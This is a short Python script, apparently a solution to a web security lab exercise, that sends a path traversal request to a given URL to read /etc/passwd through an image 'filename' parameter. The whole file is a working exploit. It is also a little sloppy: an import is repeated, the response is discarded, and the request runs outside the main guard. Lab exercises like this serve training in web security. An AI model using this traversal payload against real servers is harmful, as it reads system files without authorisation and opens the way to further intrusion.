import requests
import requests
import re
import sys

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 solution.py <url>")
        sys.exit(1)

burp_url = sys.argv[1] + '/image?filename=/var/www/images/../../../etc/passwd'

burp_headers = {}
requests.get(burp_url, headers=burp_headers)
